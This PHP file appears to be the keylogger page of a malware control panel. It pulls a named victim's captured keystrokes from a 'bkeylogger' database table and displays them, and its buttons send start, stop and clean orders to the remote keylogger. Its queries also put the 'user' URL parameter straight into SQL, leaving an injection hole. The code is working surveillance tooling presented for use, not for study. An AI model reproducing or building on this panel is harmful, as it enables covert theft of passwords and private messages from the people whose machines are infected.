<?php
	include("chk.php");
?>
<?php
	include("../config.php");
	$con=mysql_connect($host,$user,$pass);
	mysql_select_db($db,$con);
	$sel=mysql_query("select * from bkeylogger where sname='".$_GET['user']."'");
	$row=mysql_fetch_array($sel);
	
?>
<form action="" method="post">
	<textarea class="form-control" style="width:100%;height:89%"><?php echo $row['stext'];?></textarea>
		<center>
			<input class="btn btn-primary" type="submit" value="Start" name="start">
			<input class="btn btn-primary" type="submit" value="Stop" name="stop">
			<input class="btn btn-primary" type="submit" value="Clean" name="clean">
			<input class="btn btn-primary" type="submit" value="Refresh" onclick="location.reload();">
			<label>Len=0</label>
		</center>
</form>
<?php
	if(isset($_POST['start']))
	{
		include("pinc-nullorder.php");
		saveorder(1);
	}
	if(isset($_POST['stop']))
	{
		include("pinc-nullorder.php");
		saveorder(0);
	}
	if(isset($_POST['clean']))
	{
		$con=mysqli_connect($host,$user,$pass,$db);
			mysqli_query($con,"update bkeylogger set stext='' where sname='".$_GET['user']."'");
		mysqli_close($con);
	}
?>


	